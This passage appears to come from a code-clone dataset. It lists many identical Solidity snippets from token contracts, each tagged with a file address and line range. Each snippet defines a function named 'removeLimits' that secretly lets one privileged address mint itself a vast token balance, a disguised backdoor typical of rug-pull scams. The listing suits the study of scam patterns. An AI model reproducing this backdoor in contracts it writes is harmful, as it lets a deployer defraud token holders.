            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x460dad15a49c2738b3fc8cb5c7dcfa5d530847af.sol" startline="45" endline="49" pcid="2620">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x59C507Cb69406B5975e70A3c3993AF74c11EF51d.sol" startline="45" endline="49" pcid="3382">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x5d914a5ad977439fb1b9a25a6cd71ef41da418dc.sol" startline="44" endline="48" pcid="3573">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xe0A9b2Cbd7147f9fb0fE09fAcD2aAB94C0f51444.sol" startline="661" endline="665" pcid="8070">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x25CbbcDdc474eD95A5539C382ba6F486b2EB8D84.sol" startline="45" endline="49" pcid="1192">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x2C898DEc3Fb5e548b771E1A2DA4230ea7989BFF9.sol" startline="41" endline="45" pcid="1303">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x47BCDA0202Cf59825388c1Fbc6A03B52dd068121.sol" startline="45" endline="49" pcid="2697">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x22E7f1B1300DBd955C689ac4Da292f938A4AEBFA.sol" startline="43" endline="47" pcid="1044">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x9C4595f9D874E2853bc5E57bB98Ca764cBa684d0.sol" startline="46" endline="50" pcid="5683">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x2f6935cc4a043c0bf69165c791ce6f4361278715.sol" startline="45" endline="49" pcid="1439">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x3a862ec30f2b3Ce5419177221E9E1B151AcC0016.sol" startline="44" endline="48" pcid="1943">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xc4763759BDa9657Cfd06a1613Fc828afD74b70Fa.sol" startline="45" endline="49" pcid="7061">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x821d158c454B3a3Fcef1B9f35DBa9cb0e37C5453.sol" startline="44" endline="48" pcid="4851">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x92Fb66bAcacDeB0BFf34538D805521F1019dce1a.sol" startline="40" endline="44" pcid="5327">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xeE35812e1254Da3Bd81eA1ba4275f2001085d671.sol" startline="41" endline="45" pcid="8686">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x6FB11C60e84916968b4c70ca80889BD13fbEDA9b.sol" startline="44" endline="48" pcid="4071">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x6e45ced3238f28085a8a9e8d93e273013ad9d5a4.sol" startline="41" endline="45" pcid="4040">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xf0c0E88a174A69AA98fd48716CdED5cd14a1af22.sol" startline="41" endline="45" pcid="8806">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x52739F8b5C2bCD8290403e21463615B8B952f049.sol" startline="43" endline="47" pcid="3052">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x033Be8705C262bb2A12da0274297790e9479CCe1.sol" startline="42" endline="46" pcid="134">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x7bb08a75ea1D11298c6A3fF2A638153C96792C93.sol" startline="45" endline="49" pcid="4639">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x0f572144eaCF6e05F6c82b764CD1c722a6b22723.sol" startline="48" endline="52" pcid="397">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xd59623cfe3dbe4f63e02e6add0f25d3b532b21ce.sol" startline="45" endline="49" pcid="7630">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x492a83ad58177150c7519db98435f7Fa715D6022.sol" startline="42" endline="46" pcid="2759">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xA84aFAFf03113A740F0572E617d5972654F0dA4F.sol" startline="43" endline="47" pcid="6144">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xde0c85748435e9413a95aD4ED9f1c1fCe22685A9.sol" startline="42" endline="46" pcid="7923">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x084C028E04F9C7aa04b2CeE80edE5DA2Fa3bbaF2.sol" startline="42" endline="46" pcid="206">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xdeE18b2a1ac44f22E4E3Ee3de6AeD146877bCe50.sol" startline="45" endline="49" pcid="7968">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x9adA335674982c21785141cb8bD6B1e0f9ac1FC4.sol" startline="44" endline="48" pcid="5638">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xE78A151431cC384BC2Dee2dBd5115f58b1A63D6c.sol" startline="41" endline="45" pcid="8358">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x4d93ea7ef293ed2ca2d4cc9723f5e2c0c8e09dec.sol" startline="42" endline="46" pcid="2921">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xc898c687bdb580D7430277a9bcB503547a09E5ff.sol" startline="44" endline="48" pcid="7159">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xBe43ad4F6F0B27228aC7E54974a57470862FC8Bf.sol" startline="46" endline="50" pcid="6787">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x7620F8bE1A98a4F0CE86B9817767dc565C56eDF3.sol" startline="42" endline="46" pcid="4381">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x5d78329DB4EddA91c08E819b0E6a952ebBD05018.sol" startline="45" endline="49" pcid="3558">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xd80f2392f3592471ef0a0163441db092268c19ee.sol" startline="55" endline="59" pcid="7722">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x613D596e4500c1538214bf023e3151DaA7555E97.sol" startline="39" endline="43" pcid="3721">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x1E453405B5B7656ae31B7cCBb783979723244327.sol" startline="44" endline="48" pcid="935">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xBD13AACef22A780AB305c9478a801Ce8752aa7aB.sol" startline="44" endline="48" pcid="6772">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xa6Bbb91fC7029E259F590195C21C57D26F480835.sol" startline="44" endline="48" pcid="6083">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xbb23847f2A80451AFEBB0D0b48Ab6164E3bA2349.sol" startline="41" endline="45" pcid="6742">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x99818798AedD80Fef824086eF10411C89009e174.sol" startline="43" endline="47" pcid="5569">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xA8752c38CaA247fC7724A2D8d4f04e2eD410d7AC.sol" startline="44" endline="48" pcid="6159">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xF6d9Db3461567c11929e641c6beb075213efEc9d.sol" startline="45" endline="49" pcid="9015">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xA37D2E1b045B2dB51d475c8344891AB6E868e64D.sol" startline="44" endline="48" pcid="5934">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x3063792385BB315E7016f3E4eFb0560b567DB022.sol" startline="45" endline="49" pcid="1483">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x0934865C5546d21B4fD998bd5E1D3a5cD351D961.sol" startline="45" endline="49" pcid="256">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x1F4275D2806f24d44a0f047C9591141409533f8d.sol" startline="46" endline="50" pcid="984">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x187ecd1d7d930a356469551f7c71742ac2a7948d.sol" startline="44" endline="48" pcid="767">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xF0098c03f5544FcC13F8f4DeB183527801B6B40D.sol" startline="44" endline="48" pcid="8791">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x31106529aB0136C568C856A9A07dDbBAe8512865.sol" startline="42" endline="46" pcid="1542">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x441b741A92A2f35EA521918D3732D7449273EBE5.sol" startline="40" endline="44" pcid="2504">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xa342B0b37B2a6e213c61B1f19b53dFD3dF82ED53.sol" startline="42" endline="46" pcid="5919">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x8227de806a54ce72c23fab6f175d80d688536d7a.sol" startline="42" endline="46" pcid="4866">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x14CbB17f7B2adad6F00A468e7E1991969c6b3b8E.sol" startline="48" endline="52" pcid="572">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xf34839a7431d6c70673f3a3bcfb589c042fd219d.sol" startline="38" endline="42" pcid="8845">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x3c36CB64F2255b3558b0056E3c2F5C025E8B7a6d.sol" startline="47" endline="51" pcid="2074">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x76bD48f622Df028AeD28cB121DdA887F84EA805B.sol" startline="45" endline="49" pcid="4426">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xBD0DC4FC7a2797cA0bD2F0b8c792a8BF8dd96358.sol" startline="44" endline="48" pcid="6757">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xd4738e9EE70F7C409c5704A8243E2Cf75162098f.sol" startline="45" endline="49" pcid="7570">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xa33ced472a9b6dd99abc6bae53d4a905832e02cf.sol" startline="44" endline="48" pcid="5904">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x8af00a1f259F6183e35A21F47a3087489eECBF86.sol" startline="45" endline="49" pcid="5140">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xea53c94ea7862c92d0f084d24551fe4f23beb463.sol" startline="41" endline="45" pcid="8478">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x6FEDf988195cD0906d8A62D0D55D35cd35D8ef1b.sol" startline="661" endline="665" pcid="4086">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x3D0F6fAF8Ed7c849742861D7C9C7F0Bc1E7Fd116.sol" startline="44" endline="48" pcid="2178">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x747e3327A6Ca70475035e0D07f48C5E986bdD912.sol" startline="40" endline="44" pcid="4279">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x6495b9266304551eBa87fF9aD9c407Efd3c0a71c.sol" startline="41" endline="45" pcid="3798">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x22348b2351817d12C0a89c35AF96B919544D7398.sol" startline="42" endline="46" pcid="1029">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x08CA60267661ce86730fc825Be00385d8635B94B.sol" startline="44" endline="48" pcid="221">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x2362dE6A331ca1f0f5243CE99792dbEdab68D184.sol" startline="46" endline="50" pcid="1059">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xc05CA5129c0D91f039B22C3f47FD82077adA63f6.sol" startline="42" endline="46" pcid="6863">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x66bc620635dd4e5bebdc135489e7cb6f660b2064.sol" startline="38" endline="42" pcid="3833">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xdf2b11D6589a98Cf77e8e91B78cE8f2beB3dcbf5.sol" startline="40" endline="44" pcid="7998">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x5ABbDae4e6d7c89640129E87409C8F991CeE5174.sol" startline="45" endline="49" pcid="3435">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x88f233078cb6649576a6cbe8bd29a0a3811e5351.sol" startline="42" endline="46" pcid="5071">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x3f2c722fd5aedb210beaa0f6932f355c1973c94b.sol" startline="44" endline="48" pcid="2261">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x408480574c803D05a0244b479c5020a97f546c51.sol" startline="42" endline="46" pcid="2368">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xe6306Af140F6eefa1d461Ff04a549D51FF4dd16B.sol" startline="41" endline="45" pcid="8313">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x690C351f059c4963362cB75AAb802A2b95bA2B0C.sol" startline="41" endline="45" pcid="3899">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x6301C00FADD94F10409FC62E08215253fB838F46.sol" startline="42" endline="46" pcid="3768">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xaeE20ec596dC23E06aaDE3A2a2C7DD37A551bde7.sol" startline="42" endline="46" pcid="6373">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x4c143f140ee6C2E0c0f6125b3133DC67C9D95856.sol" startline="44" endline="48" pcid="2846">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x3D9efe658017c9f4e19E61c4dE211FB55B0E47d6.sol" startline="38" endline="42" pcid="2227">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x2e146811a317ba5Eb77209C942b186f67a65E801.sol" startline="45" endline="49" pcid="1364">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xe87b6341953c64df00df769dc797ea265309fe02.sol" startline="42" endline="46" pcid="8373">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x75d5d49F80871F23bEE1448070790A77C56d3d00.sol" startline="39" endline="43" pcid="4357">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x76F7c76B8bcb64CEBcDCd6eE7D9eA3F4A4203CF8.sol" startline="47" endline="51" pcid="4470">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x585E00E541d4e331A7574248beC368420BBaDdf1.sol" startline="41" endline="45" pcid="3318">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xff5c2d7Ea91Cb2a88e58E840f24088B5b445834A.sol" startline="45" endline="49" pcid="9340">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xCf60d61616a64371DF34580AcE2b13401d29C55c.sol" startline="45" endline="49" pcid="7377">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x8d9579e8591826ef37C80f680e33B6C8c38baB47.sol" startline="43" endline="47" pcid="5180">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x515Eab35fB6F9687e0D6cd8B796aEF5E7d15064F.sol" startline="369" endline="373" pcid="3021">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x8236e50E0EC3178c05910A37B9CbDd98bB013A45.sol" startline="39" endline="43" pcid="4881">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x445e4AEE9f66Fc3c4a68EBD67B2329Ff5ba5EcDc.sol" startline="43" endline="47" pcid="2534">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x31dD70842e7443108905d50c216F2CeDb452E80a.sol" startline="45" endline="49" pcid="1557">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xfFc50B460871D6dF13CA15F24c29cB646B6606f5.sol" startline="45" endline="49" pcid="9355">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x2E28a09452b865B719676E3629Fd002222D1111A.sol" startline="45" endline="49" pcid="1379">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x569BFe249181f42c823bEBda9799e1E65f4254B6.sol" startline="44" endline="48" pcid="3232">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xCE641a63a438f15A3929C0A66b1428448ccfFaae.sol" startline="47" endline="51" pcid="7335">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x5b80d34d9b91f7e424d4fb73aba7cf5647ead8fa.sol" startline="45" endline="49" pcid="3480">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xefF6ee6e86feF5f6b61560a3c99e7DCFf53f7bb6.sol" startline="41" endline="45" pcid="8776">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x3Bc0F912FcCA2528801E55FcA480F54f69a9c886.sol" startline="46" endline="50" pcid="2044">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x48ae9c1f0b3ef9f94c0dff437f8f96d49f636e6c.sol" startline="38" endline="42" pcid="2714">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xc09fB61CD91439C2CB8f8554f701c33cECA47a25.sol" startline="45" endline="49" pcid="6889">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
